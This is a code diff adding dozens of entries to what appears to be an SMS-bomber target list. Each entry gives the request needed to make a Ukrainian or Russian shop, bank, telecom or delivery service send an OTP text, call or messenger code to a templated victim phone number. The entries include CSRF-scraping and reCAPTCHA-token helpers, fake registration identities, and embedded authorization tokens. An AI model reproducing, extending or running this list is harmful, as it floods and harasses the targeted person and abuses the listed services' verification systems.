+      "url": "https://shop.kyivstar.ua/api/v2/otp_login/send/{{UA10}}",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"
+      },
+      "body": "",
+      "content_type": "",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Kyivstar_TV_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://clients.production.vidmind.com/vidmind-stb-ws/api/v2/otp",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://tv.kyivstar.ua",
+        "Referer": "https://tv.kyivstar.ua/",
+        "Content-Type": "application/json",
+        "x-activity-logging-gateway": "ALG",
+        "x-vidmind-app-version": "095122d",
+        "x-vidmind-device-id": "7707c9b4-2192-44fc-89f4-f36528ab6ee5",
+        "x-vidmind-device-type": "WEB",
+        "x-vidmind-locale": "ru_RU"
+      },
+      "body": "{\"phoneNumber\":\"{{RAW}}\",\"language\":\"RU\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "chain": "kyivstar",
+      "api_error": "ILLEGAL_MSISDN_FORMAT"
+    },
+    {
+      "name": "kyivstar_id",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://id.kyivstar.ua/auth/phone/login?client_id=nkw",
+      "headers": {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://id.kyivstar.ua",
+        "Referer": "https://id.kyivstar.ua/"
+      },
+      "body": "{\"login\":\"{{PLUS}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "market.rukavychka.ua",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://market.rukavychka.ua/index.php?route=account/confirm_phone/beforeShowPopup",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+      },
+      "body": "telephone={{RAW}}",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "stylus.ua",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://gateway.prod.stylusapp.click/auth/register",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\",\"email\":\"ljubov288631@gmail.com\",\"first_name\":\"Карл\",\"last_name\":\"Баранова\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "GetVape",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode2",
+      "headers": {
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "origin": "https://getvape.com.ua",
+        "referer": "https://getvape.com.ua/",
+        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
+      },
+      "body": "telephone={{UA3}}",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Marshal",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://api.marshal.ua/api/check-phone",
+      "headers": {
+        "accept": "application/json",
+        "accept-language": "ru",
+        "locale": "ua",
+        "User-Agent": "okhttp/4.12.0"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"phone_exist\""
+    },
+    {
+      "name": "Ochki",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://ochki.kiev.ua/index.php?route=extension/module/sms_reg/SmsCheck",
+      "headers": {
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Origin": "https://ochki.kiev.ua",
+        "Referer": "https://ochki.kiev.ua/ru/",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "body": "route=extension%2Fmodule%2Fsms_reg%2FSmsCheck&phone={{FMTUA2}}",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_error": "\"error\""
+    },
+    {
+      "name": "VivatPhoneGet",
+      "country": "UA",
+      "method": "GET",
+      "url": "https://vivat.com.ua/phone_auth/request/{{RAW}}?lang=uk",
+      "headers": {
+        "Accept": "application/json"
+      },
+      "body": "",
+      "content_type": "",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_error": "\"SMS_GATEWAY_ERROR\""
+    },
+    {
+      "name": "vivat_registration",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://vivat.com.ua/password_auth/request",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+      },
+      "body": "{\"name\":\"Фадей\",\"lastName\":\"Третьяков\",\"phone\":\"{{RAW}}\",\"email\":\"rostislav966681@gmail.com\",\"password\":\"Qwerty123!\",\"phoneCode\":\"UA\",\"checkbox\":true}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "VoliaTV",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://smart-tv.volia.com/smarttv-service/smarttv/universalAuthorizationSendOtpV2",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Authorization": "Basic c21hcnR0di11c2VyOkN2ZmhuIU5k",
+        "Origin": "https://tv.lifecell.ua",
+        "Referer": "https://tv.lifecell.ua/"
+      },
+      "body": "{\"phone\":\"{{LAST10}}\",\"language\":\"UK\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_error": "universalauthorization_error"
+    },
+    {
+      "name": "BarsGroupOTP",
+      "country": "UA",
+      "method": "GET",
+      "url": "https://business.barsgroup.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={{RAW}}",
+      "headers": {
+        "Accept": "application/json"
+      },
+      "body": "",
+      "content_type": "",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"errorCode\":0"
+    },
+    {
+      "name": "SportcityRegister",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://sportcity.ua/api/auth/register",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://sportcity.ua",
+        "Referer": "https://sportcity.ua/"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\",\"firstname\":\"Марко\",\"lastname\":\"Захарченко\",\"email\":\"oleg_20175621@gmail.com\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_error": "\"phone_exists\""
+    },
+    {
+      "name": "san_store",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://san-store.com.ua/index.php?route=product/product/getRecurringDescription",
+      "headers": {
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "accept-language": "ru-RU",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "x-requested-with": "XMLHttpRequest",
+        "sec-ch-ua": "\"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"156\", \"HeadlessChrome\";v=\"156\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\""
+      },
+      "body": "quantity={{LAST10}}&product_id=1367&product_id=1367&quantity=2&product_id=1367",
+      "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "[]"
+    }
+  ],
+  "vip": [
+    {
+      "name": "SunlightAPK",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api.sunlight.net/v3/customers/authorization/",
+      "headers": {
+        "Origin": "https://api.sunlight.net",
+        "Referer": "https://api.sunlight.net/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 AVG/133.0.0.0"
+      },
+      "body": "phone={{PLUS}}",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "SushiFuji",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://www.sushifuji.ru/get_sms_file.php",
+      "headers": {
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Origin": "https://www.sushifuji.ru",
+        "Referer": "https://www.sushifuji.ru/cheb",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "body": "phone_sms={{RAW}}&confirm_repeat=true&send=true",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "SushiSell",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://sushisell-mobile.goulash.tech/api/user/register",
+      "headers": {
+        "Accept": "*/*",
+        "app-version": "1.58.03",
+        "content-language": "en",
+        "User-Agent": "okhttp/4.12.0",
+        "Cookie": "__session__id=84655946615bfcbf.95822070",
+        "uuid": "3b3c861e5032417c",
+        "x-api-key": "224087",
+        "x-platform": "Android"
+      },
+      "body": "{\"phone\":\"{{NAT}}\",\"verify_type\":\"max_messenger\",\"bonus_register\":false}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "SushiSellCall",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://sushisell-mobile.goulash.tech/api/user/register",
+      "headers": {
+        "Accept": "*/*",
+        "app-version": "1.58.03",
+        "content-language": "en",
+        "User-Agent": "okhttp/4.12.0",
+        "Cookie": "__session__id=594920187433c80e.95822070",
+        "uuid": "a3d2c55ef97f497c",
+        "x-api-key": "224087",
+        "x-platform": "Android"
+      },
+      "body": "{\"phone\":\"{{NAT}}\",\"verify_type\":\"outgoing_call\",\"bonus_register\":false}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "VoicePassword",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://voicepassword.ru/backend.php",
+      "headers": {
+        "Accept": "*/*",
+        "Origin": "https://voicepassword.ru",
+        "Referer": "https://voicepassword.ru/registration-form.html",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "body": "set=1&count=1&number={{RU3}}",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "callkeeper",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api.callkeeper.ru/formReceiver?isSend&widgetHash=239127abe00cbe4e994e36bf03eca776&phone={{PLUS}}&backUrl=http://yar-avtomir-lada.ru",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15"
+      },
+      "body": "title=%D0%97%D0%B0%D0%BF%D0%B8%D1%81%D1%8C+%D0%BD%D0%B0+%D1%81%D0%B5%D1%80%D0%B2%D0%B8%D1%81&phone={{PLUS}}&agree=1&form_title=%D0%97%D0%B0%D0%BF%D0%B8%D1%81%D1%8C+%D0%BD%D0%B0+%D1%81%D0%B5%D1%80%D0%B2%D0%B8%D1%81",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "europlan",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://europlan.ru/api/site/validation/phone",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+      },
+      "body": "{\"phoneNumber\":\"{{NAT}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "ForwardSport_RU_CALLBACK",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://www.forward-sport.ru/local/ajax/callback.php?fancybox=true",
+      "headers": {
+        "Accept": "text/html, */*; q=0.01",
+        "Accept-Language": "ru-RU,ru;q=0.9",
+        "Referer": "https://www.forward-sport.ru/",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "needs_prepare": false,
+      "has_phone": true,
+      "chain": "forward_sport",
+      "api_ok": "success-text",
+      "api_error": "error-text"
+    },
+    {
+      "name": "PizzaSushiWok_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api.pizzasushiwok.ru/api/v1/user/request",
+      "headers": {
+        "Origin": "https://pizzasushiwok.ru",
+        "Referer": "https://pizzasushiwok.ru/"
+      },
+      "needs_prepare": false,
+      "has_phone": true,
+      "chain": "pizza_sushi_wok",
+      "api_ok": "\"ok\":true",
+      "api_error": "\"ok\":false"
+    },
+    {
+      "name": "Letu_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://www.letu.ru/s/api/user/account/v2/confirmations/phone?pushSite=storeMobileRU",
+      "headers": {
+        "Accept": "*/*",
+        "Accept-Language": "ru-RU,ru;q=0.8",
+        "Cache-Control": "no-cache",
+        "Pragma": "no-cache",
+        "Origin": "https://www.letu.ru",
+        "Referer": "https://www.letu.ru/",
+        "x-client-type": "web"
+      },
+      "body": "{\"phoneNumber\":\"{{RU1}}\"}",
+      "content_type": "application/json",
+      "api_ok": "\"mode\":\"SMS\"",
+      "api_error": "\"code\":\"phoneInvalid\"",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "AntiSushi_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://anti-sushi.ru/bd/?user_auth",
+      "headers": {
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Accept-Language": "ru-RU,ru;q=0.5",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": "https://anti-sushi.ru",
+        "Referer": "https://anti-sushi.ru/",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "body": "ACTION=RESET_PASSWORD&Session={{CSRF}}&PHONE={{NAT}}&PERSONAL_DATA_CONSENT=on",
+      "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"NextTryInSeconds\"",
+      "api_error": "\"No SID\"",
+      "csrf": {
+        "url": "https://anti-sushi.ru/",
+        "regex": "Session\\s*=\\s*\"([0-9a-fA-F-]{36})\"",
+        "ttl": 300
+      }
+    },
+    {
+      "name": "ChitaiGorodAPI_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://web-agr.chitai-gorod.ru/web/api/v3/auth-issues",
+      "headers": {
+        "Accept": "application/json",
+        "Origin": "https://www.chitai-gorod.ru",
+        "Referer": "https://www.chitai-gorod.ru/",
+        "initial-feature": "home-page",
+        "platform": "desktop",
+        "shop-brand": "chitaiGorod",
+        "user-id": "4bf4e9da321d7d8aca5ec3ad9bdbd952afbf32c93cb5f4c768670db8da13af2b"
+      },
+      "body": "{\"strategy\":\"tid\",\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"auth_issue\""
+    },
+    {
+      "name": "Lava_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://a.lava.ru/api/auth/reset-password",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://lava.ru",
+        "Referer": "https://lava.ru/",
+        "language": "ru",
+        "x-captcha-driver": "google",
+        "x-captcha-token": "{{RECAPTCHA}}"
+      },
+      "body": "{\"login\":\"{{PLUS}}\",\"password\":\"Testpass123!\",\"password_confirmation\":\"Testpass123!\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"phone_confirm_sms\"",
+      "recaptcha_v3": {
+        "anchor": "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lec-McsAAAAABjDNdoodrLlsrnvRGHsAjZc9YQl&co=aHR0cHM6Ly9sYXZhLnJ1OjQ0Mw..&hl=ru&v=4i3aN5wAweL7i3ADI7BSX4B-&size=invisible",
+        "ttl": 0
+      }
+    },
+    {
+      "name": "BookmakerRatings_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://bookmaker-ratings.ru/api/gateway/auth/send-code/",
+      "headers": {
+        "Accept": "application/json",
+        "Origin": "https://bookmaker-ratings.ru",
+        "Referer": "https://bookmaker-ratings.ru/",
+        "rb-api-version": "2.0"
+      },
+      "body": "{\"type\":\"phone\",\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"success\":true",
+      "api_error": "\"success\":false"
+    },
+    {
+      "name": "Webbankir_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://ng-api.wbbankir.ru/user/v2/phone_verification",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://registration.wbbankir.ru",
+        "Referer": "https://registration.wbbankir.ru/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "body": "{\"data\":{\"type\":\"PhoneVerification\",\"attributes\":{\"phone\":\"{{RAW}}\",\"webbankirCrossId\":\"{{UUID}}\"}}}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"state\":\"sent\"",
+      "api_error": "spamProtectionRestriction"
+    },
+    {
+      "name": "Beriberu_Reset_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://borrow.beriberu.ru/rpc/v1",
+      "headers": {
+        "Accept": "*/*",
+        "Origin": "https://borrow.beriberu.ru",
+        "Referer": "https://borrow.beriberu.ru/phone",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"jsonrpc\":\"2.0\",\"id\":\"{{UUID}}\",\"method\":\"resetPassword\",\"params\":{\"login\":\"{{PLUS}}\"}}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"result\":\"success\"",
+      "api_error": "Internal error"
+    },
+    {
+      "name": "Samokat_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api-web.samokat.ru/confirmation/code",
+      "headers": {
+        "Origin": "https://samokat.ru",
+        "Referer": "https://samokat.ru/",
+        "x-application-platform": "web"
+      },
+      "body": "{\"phoneNumber\":\"{{PLUS}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"retryTimeout\":"
+    },
+    {
+      "name": "Cvetov24_Call_RU",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://site.cvetov24.ru/api/v5/registration",
+      "headers": {
+        "Origin": "https://cvetov.com",
+        "Referer": "https://cvetov.com/",
+        "Accept": "application/json",
+        "version": "true"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\",\"auth_method\":\"call\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"registration\":\"success\""
+    },
+    {
+      "name": "Cvetov24_Max_RU",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://site.cvetov24.ru/api/v5/registration",
+      "headers": {
+        "Origin": "https://cvetov.com",
+        "Referer": "https://cvetov.com/",
+        "Accept": "application/json",
+        "version": "true"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\",\"auth_method\":\"max\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"registration\":\"success\""
+    },
+    {
+      "name": "Cvetov24_Telegram_RU",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://site.cvetov24.ru/api/v5/registration",
+      "headers": {
+        "Origin": "https://cvetov.com",
+        "Referer": "https://cvetov.com/",
+        "Accept": "application/json",
+        "version": "true"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\",\"auth_method\":\"telegram\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"registration\":\"success\""
+    },
+    {
+      "name": "sportcity.ua",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://sportcity.ua/ua/login/",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
+      },
+      "body": "login={{RAW}}&wa_json_mode=1&need_redirects=1&send_onetime_password=1",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "FoxtrotPhone_UA_SMS",
+      "country": "UA",
+      "method": "GET",
+      "url": "https://www.foxtrot.com.ua/uk/account/requestphoneauthentication?phone={{RAW}}",
+      "headers": {
+        "Accept": "application/json"
+      },
+      "body": "",
+      "content_type": "",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "FoxtrotAPI",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://api.foxtrot.com.ua/api/v1/auth/send-sms",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Platform": "Android",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.1555.1494 Mobile Safari/537.36",
+        "Version": "232"
+      },
+      "body": "{\"phone\":\"{{RAW}}\",\"templateId\":12308}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "avrora.ua",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://avrora.ua/index.php?dispatch=otp.send",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"
+      },
+      "body": "phone={{RAW}}&is_ajax=1",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "DominosForgot",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://api-v3.dominos.ua/api/v3/account/password/forgot?region=kyiv",
+      "headers": {
+        "Accept": "application/json",
+        "Accept-Language": "ua-ua",
+        "Authorization": "Bearer eyJhbGciOiJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNobWFjLXNoYTUxMiIsInR5cCI6IkpXVCJ9.eyJhbm9ueW1vdXNVc2VySWQiOiJkOWEzNjg4Yi1lMGQ1LTRhMDYtYmIwMi1lZWU1NGE4NDM3NjkiLCJleHAiOjE3NzkxMDQyNzd9.3rl7WvT2YcJEGnOuvqROPPcJmWieUxmfd22K24kxGATtg_0eGWBfNw3hENxNi6ltcqf6iMwIriuAm4QQAEp8qw",
+        "Cache-Control": "no-cache",
+        "Origin": "https://dominos.ua",
+        "Referer": "https://dominos.ua/",
+        "Sec-CH-UA": "\"Not:A-Brand\";v=\"99\", \"Google Chrome\";v=\"145\", \"Chromium\";v=\"145\"",
+        "Sec-CH-UA-Mobile": "?0",
+        "Sec-CH-UA-Platform": "\"macOS\"",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-site",
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
+      },
+      "body": "{\"phoneNumber\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Esculab",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://esculab.com/api/auth/authorise",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3",
+        "Origin": "https://esculab.com",
+        "Referer": "https://esculab.com/",
+        "Sec-CH-UA": "\"Not:A-Brand\";v=\"99\", \"Google Chrome\";v=\"145\", \"Chromium\";v=\"145\"",
+        "Sec-CH-UA-Mobile": "?0",
+        "Sec-CH-UA-Platform": "\"macOS\"",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\",\"uuid\":\"{{UUID}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Aurum",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://aurum.in.ua/local/ajax/authorize.php?lang=ru",
+      "headers": {
+        "Accept": "*/*",
+        "Origin": "https://aurum.in.ua",
+        "Referer": "https://aurum.in.ua/actions/zagalna/"
+      },
+      "body": "{\"phone\":\"{{UA1}}\",\"lang\":\"ru\",\"type\":\"\",\"token\":null,\"codeType\":\"code\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "aurum.in.ua",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://aurum.in.ua/local/ajax/authorize.php?lang=ru",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Safari/537.36"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\",\"lang\":\"ru\",\"type\":\"\",\"token\":null,\"codeType\":\"code\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "ProntoPizza",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://prontopizza.ua/wp-admin/admin-ajax.php",
+      "headers": {
+        "Origin": "https://prontopizza.ua",
+        "Referer": "https://prontopizza.ua/",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "body": "first_name=%D0%9C%D0%B0%D1%80%D0%BA&last_name=%D0%97%D0%B0%D1%85%D0%B0%D1%80%D1%87%D0%B5%D0%BD%D0%BA%D0%BE&birthday=15.01.2000&phone={{UALOCAL}}&input_check_send_sms=&email=oleg_20175621%40gmail.com&password=sAabsQX3RYReyi&password2=sAabsQX3RYReyi&agree=on&action=register_user&nonce={{CSRF}}",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true,
+      "csrf": {
+        "url": "https://prontopizza.ua/",
+        "regex": "\"ajax_nonce\"\\s*:\\s*\"([^\"]+)\"",
+        "ttl": 300
+      },
+      "api_ok": "\"sms_send\":true"
+    },
+    {
+      "name": "Stolychna",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://stolychnashop.com.ua/ajax/?execute=sendCodeVerification",
+      "headers": {
+        "accept": "*/*",
+        "accept-language": "ru-RU,ru;q=0.8",
+        "cache-control": "no-cache",
+        "origin": "https://stolychnashop.com.ua",
+        "pragma": "no-cache",
+        "priority": "u=1, i",
+        "referer": "https://stolychnashop.com.ua/ua/",
+        "sec-ch-ua": "\"Not=A?Brand\";v=\"99\", \"Brave\";v=\"151\", \"Chromium\";v=\"151\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "sec-gpc": "1",
+        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Safari/605.1.15"
+      },
+      "body": "{\"typeCode\":\"auth\",\"phone\":\"{{UA1}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_error": "\"success\":false"
+    },
+    {
+      "name": "BoltDriver_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration?version=HP.24.31&device_name=HP&device_os_version=web&deviceId=web&deviceType=web&language=uk-ua",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://driver.bolt.eu",
+        "Referer": "https://driver.bolt.eu/"
+      },
+      "body": "{\"email\":\"{{UUID}}@gmail.com\",\"phone\":\"{{PLUS}}\",\"city_id\":158,\"terms_consent_accepted\":1}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"code\":0"
+    },
+    {
+      "name": "Vencon_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://vencon.ua/ua/auth/sign-up",
+      "headers": {
+        "accept": "*/*",
+        "origin": "https://vencon.ua",
+        "referer": "https://vencon.ua/ua/loyalty?scrollToElement=bonus-for-sign-up",
+        "x-requested-with": "XMLHttpRequest"
+      },
